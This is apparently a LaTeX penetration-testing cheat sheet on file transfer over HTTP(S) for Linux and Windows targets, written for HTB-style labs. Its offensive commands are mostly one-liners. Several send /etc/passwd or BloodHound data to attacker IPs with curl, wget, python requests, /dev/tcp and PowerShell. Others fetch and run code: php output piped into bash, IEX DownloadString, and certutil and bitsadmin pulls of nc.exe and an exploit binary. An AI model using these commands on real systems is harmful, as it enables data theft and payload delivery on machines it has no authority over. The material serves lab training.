\section{over HTTP(S)}
\subsection{Linux Server}
\subsubsection{HTTPS Nginx enable PUT}

Enable hosts in \verb+/etc/nginx/nginx.conf+:

\begin{verbatim}
http {
    ...
    include sites-enabled/*;
}
\end{verbatim}

Create host directory:
\begin{verbatim}
sudo mkdir -p /usr/share/nginx/<site-name>
sudo chown -R http:http /usr/share/nginx/<site-name>
\end{verbatim}

Create self-signed certificate (see~\ref{openssl-selfsigned}) in 
\verb+/etc/nginx/certs/<site-name>+

Create host config (\verb+/etc/nginx/sites-available/<site-name>.conf+):
\begin{verbatim}
server {
    listen              443 ssl;
    server_name         <site-name>;
    ssl_certificate      /etc/nginx/certs/<site-name>/certificate.pem;
    ssl_certificate_key  /etc/nginx/certs/<site-name>/key.pem;
    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers         HIGH:!aNULL:!MD5;

	location / {
		root	/usr/share/nginx/<site-name>;
        autoindex on;
		dav_methods	PUT;
	}
}

\end{verbatim}

enable host and restart nginx:
\begin{verbatim}
# symlink might not work
sudo ln -s /etc/nginx/sites-available/<site-name>.conf /etc/nginx/sites-enabled/
sudo systemctl restart nginx.service
\end{verbatim}

\subsubsection{Upload server (python)}

\begin{verbatim}
python3 -m uploadserver 

python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

\end{verbatim}


\subsubsection{Updog (python)}

\begin{verbatim}
updog [-d DIRECTORY] [-p PORT] [--password PASSWORD] [--ssl]
\end{verbatim}

\begin{verbatim}
curl -XPOST -F "file=@/etc/passwd;filename=passwd" -F "path=." http://10.10.10.248:9090/upload
curl -XPOST -k -F "file=@/etc/passwd;filename=passwd" -F "path=." https://10.10.10.248:9090/upload
\end{verbatim}



\subsubsection{HTTPS SoCat}

Create self-signed certificate (see~\ref{openssl-selfsigned}) and concatenate
key file and cert file into a single file (\verb+tls.pem+)

to send a file:
\begin{verbatim}
# send to prey
socat -v -d -d OPENSSL-LISTEN:1234,crlf,reuseaddr,fork,cert=tls.pem \
    SYSTEM:"
        echo HTTP/1.1 200 OK; 
        echo Content-Type\: text/plain; 
        echo; 
        cat <some_file_response>
    "
\end{verbatim}

to receive a file:

TODO

\subsubsection{HTTP SoCat}

Replace \verb+OPENSSL-LISTEN+ by \verb+TCP-LISTEN+

\subsubsection{HTTP ncat}
\begin{verbatim}
nc -lnvp 8080 > FILENAME
\end{verbatim}

\subsubsection{Interpreted Languages}
\textbf{Python} 
\begin{verbatim}
python -m SimpleHTTPServer 8080
\end{verbatim}

\textbf{Python3} 
\begin{verbatim}
python3 -m http.server 8080
\end{verbatim}

\textbf{Ruby} 
\begin{verbatim}
ruby -run -ehttpd . -p8080
\end{verbatim}

\textbf{Php} 
\begin{verbatim}
php -S 0.0.0.0:8080
\end{verbatim}

\textbf{Socat} 
\begin{verbatim}
socat TCP-LISTEN:8080,reuseaddr,fork
\end{verbatim}

\subsection{Windows Server}
\verb+PS C:\htb> Add-WindowsFeature Web-Server, Web-Mgmt-Tools+

\subsection{Linux client}

\subsubsection{wget}
\begin{verbatim}
#download file
wget SRC_URL -o DEST_FILE
#upload file
wget --post-file ./res.asc http://10.10.16.3:8080
\end{verbatim}


\subsubsection{curl}
\begin{verbatim}
# upload file
curl -k -T SRC_FILE DEST_URL

#download file
curl -o FIL_DEST URL_SRC
\end{verbatim}

\subsubsection{bash (http)}
To download a file:
\begin{verbatim}
# Connect to Target's Webserver
exec 3<>/dev/tcp/IP_SERVER/PORT_SERVER
# HTTP GET Request
echo -e "GET /FILE_PATH HTTP/1.1\n\n">&3
# Print the Response
cat <&3
\end{verbatim}

To upload a file:
\begin{verbatim}
cat SRC_FILE > /dev/tcp/IP_SERVER/PORT_SERVER
\end{verbatim}


\subsubsection{php}
To download a file:
\begin{verbatim}
# File_get_contents()
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'

# Fopen()
php -r 'const BUFFER = 1024; $fremote =
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'

# Php-curl
php -r '$rfile = "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"; $lfile = "LinEnum.sh"; $fp = fopen($lfile, "w+"); $ch = curl_init($rfile); curl_setopt($ch, CURLOPT_FILE, $fp); curl_setopt($ch, CURLOPT_TIMEOUT, 20); curl_exec($ch);'
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
\end{verbatim}

\subsubsection{python}
\begin{verbatim}
# python2
import urllib
urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")

# Python 3
import urllib.request
urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")



python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'

\end{verbatim}

\subsubsection{Other languages}

\subsubsection{}
\begin{verbatim}
# Ruby
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'

# Perl

perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'

# Go

package main

import (
	 "os"
     "io"
     "net/http"
)
func main() {
     lfile, err := os.Create("LinEnum.sh")
     _ = err
     defer lfile.Close()

     rfile := "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"
     response, err := http.Get(rfile)
     defer response.Body.Close()

     io.Copy(lfile, response.Body)
}
\end{verbatim}

\subsection{Windows client}

\subsubsection{Certutil}
\begin{verbatim}
certutil.exe -urlcache -split -f http://10.0.0.5/40564.exe bad.exe
\end{verbatim}

\subsubsection{CertReq}

\begin{verbatim}
CertReq -Post -config https://example.org/ c:\windows\win.ini
\end{verbatim}

\subsubsection{PowerShell}
To download a file:
\begin{verbatim}
curl http://IP/file -O PATH
\end{verbatim}

\begin{verbatim}
IEX (New-Object System.Net.WebClient).DownloadFile('URLSRC',"LOCAL_PATH")

Invoke-WebRequest URL  -OutFile PATH

IEX (New-Object Net.WebClient).DownloadString('URL')

#Invoke-WebRequest URL -Outfile PATH
Invoke-WebRequest http://10.10.16.3:8080/chisel.exe -Outfile c:\users\public\chisel.exe

\end{verbatim}

\verb+-UseBasicParsing+: bypass IE initial config

To upload a file:
\begin{verbatim}
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))

Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64


$stp = [System.convert]::FromBase64String((Get-Content -Path './upload_win.txt'))
Set-COntent -Path './xx.exe' $stp -Encoding Byte

\end{verbatim}

\subsubsection{bitsadmin}

\begin{verbatim}
bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
\end{verbatim}

To download a file
\begin{verbatim}
Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
\end{verbatim}

To upload a file
\begin{verbatim}
Start-BitsTransfer "C:\Temp\bloodhound.zip"
	-Destination "http://10.10.10.132/uploads/bloodhound.zip"
	-TransferType Upload -ProxyUsage Override
	-ProxyList PROXY01:8080
	-ProxyCredential INLANEFREIGHT\svc-sql
\end{verbatim}
